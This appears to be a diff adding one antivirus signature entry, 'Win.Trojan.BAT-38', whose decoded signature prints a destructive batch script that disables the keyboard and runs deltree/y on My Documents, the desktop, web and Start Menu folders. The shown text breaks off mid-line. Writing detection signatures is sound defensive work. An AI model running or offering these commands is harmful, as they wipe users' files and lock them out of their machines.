@@ -1,0 +1,13 @@
+VIRUS NAME: Win.Trojan.BAT-38
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+echo off
+c:\windows\rundll32.exe keyboard,disable
+cd\
+deltree/y mydocu~1
+cd windows
+deltree/y desktop >nul
+deltree/y web >nul
+deltree/y startm~1 >nul
+d
